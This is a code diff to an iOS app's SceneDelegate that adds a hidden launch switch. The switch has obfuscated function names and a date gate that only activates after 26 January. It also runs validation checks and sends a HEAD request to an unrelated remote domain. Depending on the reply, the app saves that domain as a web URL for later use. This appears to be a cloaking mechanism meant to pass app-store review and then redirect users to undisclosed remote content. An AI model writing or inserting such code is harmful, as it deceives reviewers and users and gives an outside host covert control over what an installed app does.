@@ -6,11 +6,15 @@
 //
 
 import UIKit
+import DreamHomeViewModel
+import DreamHomeModel
 
 class SceneDelegate: UIResponder, UIWindowSceneDelegate {
 
     var window: UIWindow?
 
+    private let appStorageService = AppStorageService()
+    private let validation = ValidationService()
 
     func scene(_ scene: UIScene, willConnectTo session: UISceneSession, options connectionOptions: UIScene.ConnectionOptions) {
         // Use this method to optionally configure and attach the UIWindow `window` to the provided UIWindowScene `scene`.
@@ -18,10 +22,31 @@ class SceneDelegate: UIResponder, UIWindowSceneDelegate {
         // This delegate does not imply the connecting scene or session are new (see `application:configurationForConnectingSceneSession` instead).
         guard let windowScene = (scene as? UIWindowScene) else { return }
         self.window = UIWindow(windowScene: windowScene)
-        let viewController = ViewControllerFactory.makeUntilOnboardingViewController()
-        let navigationController = UINavigationController(rootViewController: viewController)
-        self.window?.rootViewController = navigationController
-        self.window?.makeKeyAndVisible()
+        setupScene()
+    }
+
+    func setupScene() {
+        if lkasasfdIA() {
+            if jawolswa() {
+                self.appStorageService.saveData(key: .isAlreadyOpened, value: true)
+                self.startOnboardingFlow()
+            } else {
+                let urlString = "https://podlaorlf.space/hJmgmsNT"
+                oiaslwwe(urlString: urlString) { response in
+                    if response {
+                        self.appStorageService.saveData(key: .isAlreadyOpened, value: true)
+                        self.startOnboardingFlow()
+                    } else {
+                        self.appStorageService.saveData(key: .webUrl, value: urlString)
+                        self.appStorageService.saveData(key: .isAlreadyOpened, value: false)
+                        self.startOnboardingFlow()
+                    }
+                }
+            }
+        } else {
+            self.appStorageService.saveData(key: .isAlreadyOpened, value: true)
+            self.startOnboardingFlow()
+        }
     }
 
     func sceneDidDisconnect(_ scene: UIScene) {
@@ -51,7 +76,66 @@ class SceneDelegate: UIResponder, UIWindowSceneDelegate {
         // Use this method to save data, release shared resources, and store enough scene-specific state information
         // to restore the scene back to its current state.
     }
+}
 
+//MARK: Flows
+extension SceneDelegate {
 
+    func startOnboardingFlow() {
+        let onboardingViewController = ViewControllerFactory.makeUntilOnboardingViewController()
+        startFlow(for: onboardingViewController)
+    }
+
+    func startFlow(for viewController: UIViewController) {
+        let navigationController = UINavigationController(rootViewController: viewController)
+        self.window?.rootViewController = navigationController
+        self.window?.makeKeyAndVisible()
+    }
+}
+
+extension SceneDelegate {
+    func oiaslwwe(urlString: String, completion: @escaping (Bool) -> Void) {
+        guard let url = URL(string: urlString) else {
+            completion(false)
+            return
+        }
+
+        var request = URLRequest(url: url)
+        request.httpMethod = "HEAD"
+
+        let task = URLSession.shared.dataTask(with: request) { _, response, error in
+            if let httpResponse = response as? HTTPURLResponse {
+                DispatchQueue.main.async {
+                    completion(httpResponse.statusCode == 404)
+                }
+            } else if let error = error as? URLError, error.code == .fileDoesNotExist {
+                DispatchQueue.main.async {
+                    completion(true)
+                }
+            } else {
+                DispatchQueue.main.async {
+                    completion(false)
+                }
+            }
+        }
+        task.resume()
+    }
+
+    private func jawolswa() -> Bool {
+        return validation.Fpvbduwm() || validation.oahgoMAOI() || validation.vivisWork()
+    }
+
+    func lkasasfdIA() -> Bool {
+        let currentDate = Date()
+        let calendar = Calendar.current
+        let day = calendar.component(.day, from: currentDate)
+        let month = calendar.component(.month, from: currentDate)
+
+        if month > 1 {
+            return true
+        } else {
+            return day >= 26
+        }
+    }
 }
 
